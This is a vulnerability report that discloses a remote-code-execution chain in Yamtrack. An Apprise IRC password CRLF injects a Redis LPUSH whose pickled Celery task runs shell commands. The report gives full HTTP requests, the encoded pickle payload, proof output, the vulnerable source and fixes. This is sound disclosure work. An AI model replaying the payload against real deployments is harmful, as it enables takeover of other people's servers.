### Vulnerability details

**Official website / Product:** https://github.com/FuzzyGrim/Yamtrack

**Repository:** FuzzyGrim/Yamtrack (stars at selection: 3767)

**Vulnerability type:** RCE / getshell (Apprise IRC `password` CRLF → Redis RESP `LPUSH` → Celery pickle deserialization)

**Vulnerability versions:** Docker `ghcr.io/fuzzygrim/yamtrack:latest` (app v0.26.3, image revision `76856f9e053e7f59469d1eac0238727263e2adfd`, digest `sha256:ce4bcaf4276da362d5fba88e9dc5e8c1b9821b0960038f7eb95bb0e81c172df9`); source tip `387274467e771845cf84fe3ceb1b249ad8405e41` still sets `CELERY_TASK_SERIALIZER = "pickle"`; bundled Apprise 1.12.0, Celery 5.6.3, Django 5.2.16

**Vulnerability URL / Parameter:** `POST /settings/notifications` form field `notification_urls`; trigger `GET /test_notification`. Malicious URL shape: `irc://redis:6379/#x?password=` + URL-encoded `\r\n` + Redis RESP `LPUSH celery <celery-pickle-json>`

**Complex:** yes

### Verification procedure

1. Start the lab with the compose below (host port **19009**, official image + `redis:8-alpine`, Redis hostname `redis` on the app network):

```yaml
services:
  yamtrack:
    container_name: yamtrack-r10a9
    image: ghcr.io/fuzzygrim/yamtrack:latest
    # audited digest: sha256:ce4bcaf4276da362d5fba88e9dc5e8c1b9821b0960038f7eb95bb0e81c172df9
    # image revision: 76856f9e053e7f59469d1eac0238727263e2adfd (app v0.26.3)
    depends_on:
      - redis
    environment:
      - TZ=Europe/Berlin
      - SECRET=longstring
      - REDIS_URL=redis://redis:6379
      - REGISTRATION=True
    ports:
      - "19009:8000"

  redis:
    container_name: yamtrack-r10a9-redis
    image: redis:8-alpine
    volumes:
      - redis_data:/data

volumes:
  redis_data:
```

   Run `docker compose up -d` and wait until `http://127.0.0.1:19009/health/` is up.

2. Default `REGISTRATION=True` (django-allauth). Open `http://127.0.0.1:19009/accounts/signup/`, register any user, then log in via `/accounts/login/`. Take `sessionid` and `csrftoken` from Set-Cookie; the form field `csrfmiddlewaretoken` must match the `csrftoken` cookie (or scrape the hidden input from `GET /settings/notifications`). The Cookie/CSRF values in the PoC below are lab captures — replace them with your own session when reproducing.

3. `POST /settings/notifications` with `notification_urls` set to an IRC URL targeting the in-compose Redis hostname, `password` carrying CRLF + RESP `LPUSH` of a Celery task envelope with `content-type: application/x-python-serialize` and an `os.system` pickle body. Full URL is in the PoC below.

4. `GET /test_notification`: Yamtrack calls `apprise.Apprise.notify()`; the IRC plugin “registers” to Redis:6379; the first outbound line `PASS {password}\r\n` writes forged RESP into Redis; the Celery worker pops the task and runs `__reduce__` during unpickle.

5. `docker exec yamtrack-r10a9 cat /tmp/r10a9-proof.txt` shows `uid=1000(abc)` and `GETSHELL_OK`.

### Full vulnerability PoC

Complete HTTP request/response messages (captured from Docker). Replace Cookie/`csrfmiddlewaretoken` per step 2:

```http
# --- Step A: save malicious Apprise IRC URL (authenticated; open registration) ---
POST /settings/notifications HTTP/1.1
Host: 127.0.0.1:19009
User-Agent: yamtrack-r10a9-poc
Accept: text/html,application/xhtml+xml
Content-Type: application/x-www-form-urlencoded
Content-Length: 1398
Origin: http://127.0.0.1:19009
Referer: http://127.0.0.1:19009/settings/notifications
Cookie: csrftoken=AqwoMqvHBqfTm8l18jpu5lRDTJELlpH9; sessionid=3gxi0xm5cssicmv4fi2kwux69hyuikcs
Connection: close

csrfmiddlewaretoken=qOnQu8x77PMpU1jq9LuVQ6zkQ41tnAOjQ4J46oSEy5R86Zuh7UJfLhgNzDv4yPli&notification_urls=irc%3A%2F%2Fredis%3A6379%2F%23x%3Fpassword%3Dx%250D%250A%252A3%250D%250A%25245%250D%250ALPUSH%250D%250A%25246%250D%250Acelery%250D%250A%2524667%250D%250A%257B%2522body%2522%253A%2522gASV0gAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjIJpZCA%252BL3RtcC9yMTBhOS1wcm9vZi50eHQgMj4mMTsgaG9zdG5hbWUgPj4vdG1wL3IxMGE5LXByb29mLnR4dDsgZWNobyBHRVRTSEVMTF9PSyA%252BPi90bXAvcjEwYTktcHJvb2YudHh0OyB0b3VjaCAvdG1wL3IxMGE5LXByb29mLm9rlIWUUpSFlH2UfZQojAljYWxsYmFja3OUTowIZXJyYmFja3OUTowFY2hhaW6UTowFY2hvcmSUTnWHlC4%253D%2522%252C%2522content-encoding%2522%253A%2522binary%2522%252C%2522content-type%2522%253A%2522application%252Fx-python-serialize%2522%252C%2522headers%2522%253A%257B%2522lang%2522%253A%2522py%2522%252C%2522task%2522%253A%2522Cleanup%2520user%2520messages%2522%252C%2522id%2522%253A%2522r10a9-poc-2%2522%252C%2522root_id%2522%253A%2522r10a9-poc-2%2522%257D%252C%2522properties%2522%253A%257B%2522correlation_id%2522%253A%2522r10a9-poc-2%2522%252C%2522delivery_mode%2522%253A2%252C%2522delivery_info%2522%253A%257B%2522exchange%2522%253A%2522%2522%252C%2522routing_key%2522%253A%2522celery%2522%257D%252C%2522priority%2522%253A0%252C%2522body_encoding%2522%253A%2522base64%2522%252C%2522delivery_tag%2522%253A%2522r10a9-poc-2%2522%257D%257D%250D%250A&daily_digest_enabled=on&release_notifications_enabled=on

# --- Step A response ---
HTTP/1.1 302 Found
Server: nginx/1.28.3
Date: Sun, 01 Nov 2026 13:33:01 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 0
Connection: close
Location: /settings/notifications
X-Frame-Options: DENY
Vary: Cookie
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin
Set-Cookie: messages=W1siX19qc29uX21lc3NhZ2UiLDAsMjUsIk5vdGlmaWNhdGlvbiBzZXR0aW5ncyB1cGRhdGVkIHN1Y2Nlc3NmdWxseSEiLCIiXV0:1xNVgD:XlMxYgDXeaUEtdUOGzaDvfQrUxomUeNScm_0zY0sn50; HttpOnly; Path=/; SameSite=Lax
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Referrer-Policy: no-referrer-when-downgrade

# --- Step B: trigger Apprise notify → IRC PASS CRLF → Redis LPUSH celery pickle ---
GET /test_notification HTTP/1.1
Host: 127.0.0.1:19009
User-Agent: yamtrack-r10a9-poc
Accept: text/html,application/xhtml+xml
Referer: http://127.0.0.1:19009/settings/notifications
Cookie: csrftoken=AqwoMqvHBqfTm8l18jpu5lRDTJELlpH9; sessionid=3gxi0xm5cssicmv4fi2kwux69hyuikcs
Connection: close

# --- Step B response (IRC to redis fails after PASS already flushed; RCE already ran) ---
HTTP/1.1 302 Found
Server: nginx/1.28.3
Date: Sun, 01 Nov 2026 13:33:31 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 0
Connection: close
Location: /settings/notifications
X-Frame-Options: DENY
Vary: Cookie
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin
Set-Cookie: messages=W1siX19qc29uX21lc3NhZ2UiLDAsNDAsIkZhaWxlZCB0byBzZW5kIHRlc3Qgbm90aWZpY2F0aW9uLiIsIiJdXQ:1xNVgh:8P9xYzQLh0FC55AObWRaxLAZek4YWRquZc1t4u9S9yY; HttpOnly; Path=/; SameSite=Lax
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Referrer-Policy: no-referrer-when-downgrade
```

Apprise URL before form-encoding:

```
irc://redis:6379/#x?password=x%0D%0A%2A3%0D%0A%245%0D%0ALPUSH%0D%0A%246%0D%0Acelery%0D%0A%24667%0D%0A%7B%22body%22%3A%22gASV0gAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjIJpZCA%2BL3RtcC9yMTBhOS1wcm9vZi50eHQgMj4mMTsgaG9zdG5hbWUgPj4vdG1wL3IxMGE5LXByb29mLnR4dDsgZWNobyBHRVRTSEVMTF9PSyA%2BPi90bXAvcjEwYTktcHJvb2YudHh0OyB0b3VjaCAvdG1wL3IxMGE5LXByb29mLm9rlIWUUpSFlH2UfZQojAljYWxsYmFja3OUTowIZXJyYmFja3OUTowFY2hhaW6UTowFY2hvcmSUTnWHlC4%3D%22%2C%22content-encoding%22%3A%22binary%22%2C%22content-type%22%3A%22application%2Fx-python-serialize%22%2C%22headers%22%3A%7B%22lang%22%3A%22py%22%2C%22task%22%3A%22Cleanup%20user%20messages%22%2C%22id%22%3A%22r10a9-poc-2%22%2C%22root_id%22%3A%22r10a9-poc-2%22%7D%2C%22properties%22%3A%7B%22correlation_id%22%3A%22r10a9-poc-2%22%2C%22delivery_mode%22%3A2%2C%22delivery_info%22%3A%7B%22exchange%22%3A%22%22%2C%22routing_key%22%3A%22celery%22%7D%2C%22priority%22%3A0%2C%22body_encoding%22%3A%22base64%22%2C%22delivery_tag%22%3A%22r10a9-poc-2%22%7D%7D%0D%0A
```

Verification result:

- POST returns 302 with flash “Notification settings updated successfully!”.
- GET `/test_notification` returns 302 after ~30s (IRC waits for 001 and times out with Failed to send); **before** that timeout the `PASS` line is flushed, Redis has the `LPUSH`, and worker logs `Task Cleanup user messages[r10a9-poc-2] received`.
- Container file `/tmp/r10a9-proof.txt`:
```
uid=1000(abc) gid=1000(abc) groups=1000(abc)
971765d6df97
GETSHELL_OK
```
- Worker then raises `TypeError: cleanup_user_messages() takes 0 positional arguments but 1 was given` on the real task callable — that exception is **after** pickle `__reduce__`→`os.system` already ran. Celery worker log excerpt:
```
[2026-11-01 14:33:01 +0100] [42] [INFO] Task Cleanup user messages[r10a9-poc-2] received
[2026-11-01 14:33:01 +0100] [895] [ERROR] Task Cleanup user messages[r10a9-poc-2] raised unexpected: TypeError('cleanup_user_messages() takes 0 positional arguments but 1 was given')
Traceback (most recent call last):
  File "/yamtrack/.venv/lib/python3.12/site-packages/celery/app/trace.py", line 585, in trace_task
```
  Container state on successful repro: `yamtrack-r10a9` publishes `0.0.0.0:19009->8000/tcp`; compose peer `yamtrack-r10a9-redis` (`redis:8-alpine`) serves 6379 on the app network.

### Vulnerability analysis

Yamtrack lets any logged-in user (open registration by default) store arbitrary Apprise URLs and invokes `apobj.notify()` from `GET /test_notification` and from digest/release notification tasks. The official Docker Compose places Redis at hostname `redis` on the app network, and:

1. **Celery serializes with pickle and accepts Python serialize content** (`src/config/settings.py`).
2. **Apprise IRC** emits `PASS {password}` during registration and appends `\r\n` in `_queue` **without CRLF sanitizing** password/nick/name.

The attacker sets `password` to `x\r\n` + a valid Redis RESP `LPUSH celery <json>` and points IRC at `redis:6379`. Redis ignores the leading junk `PASS x` and runs `LPUSH`. The worker’s pickle load of `body` triggers `__reduce__`, yielding arbitrary commands as `abc` (uid=1000). Scheduled digest/release notify paths are equivalent triggers.

Vulnerable trigger / sink source (complete path and line numbers):

```python
# File: src/config/settings.py
# Lines: 555-557 (v0.26.3 / image rev 76856f9)
CELERY_TASK_SERIALIZER = "pickle"
CELERY_ACCEPT_CONTENT = ["application/json", "application/x-python-serialize"]
```

```python
# File: src/users/views.py
# Lines: 179-215
@require_GET
def test_notification(request):
    """Send a test notification to the user."""
    try:
        apobj = apprise.Apprise()
        notification_urls = [
            url.strip()
            for url in request.user.notification_urls.splitlines()
            if url.strip()
        ]
        if not notification_urls:
            messages.error(request, "No notification URLs configured.")
            return redirect("notifications")

        for url in notification_urls:
            apobj.add(url)

        result = apobj.notify(
            title="YamTrack Test Notification",
            body=(
                "This is a test notification from YamTrack. "
                "If you're seeing this, your notifications are working correctly!"
            ),
        )

        if result:
            messages.success(request, "Test notification sent successfully!")
        else:
            messages.error(request, "Failed to send test notification.")
    except Exception:
        logger.exception("Error sending notification")

    return redirect("notifications")
```

```python
# File: site-packages/apprise/plugins/irc/state.py (Apprise 1.12.0)
# Lines: 124-141
def start_registration(self) -> list[IRCAction]:
    """Begin registration by emitting PASS/NICK/USER as required."""
    self.state = IRCState.REGISTERING
    out: list[IRCAction] = []
    if self.ctx.password:
        out.append(
            IRCAction(IRCActionKind.SEND, line=f"PASS {self.ctx.password}")
        )
    out.append(
        IRCAction(IRCActionKind.SEND, line=f"NICK {self.ctx.desired_nick}")
    )
    out.append(
        IRCAction(
            IRCActionKind.SEND,
            line=f"USER {self.ctx.desired_nick} 0 * :{self.ctx.fullname}",
        ),
    )
    return out
```

```python
# File: site-packages/apprise/plugins/irc/client.py (Apprise 1.12.0)
# Lines: 133-138
def _queue(self, line: str) -> None:
    payload = (line + "\r\n").encode("utf-8", errors="replace")
    self._out_queue.append(payload)
```

### Vulnerability Fix

1. Switch `CELERY_TASK_SERIALIZER` / result serializer to `json` and remove `application/x-python-serialize` from `CELERY_ACCEPT_CONTENT` (primary pickle RCE mitigation).
2. Restrict Apprise URL schemas/hosts: block internal, broker, and metadata targets; or disable IRC/custom protocols.
3. Upstream Apprise: strip CRLF/control chars from IRC `password`/`nick`/`name`.
4. Disable open registration in production, or limit notification URL configuration to admins.
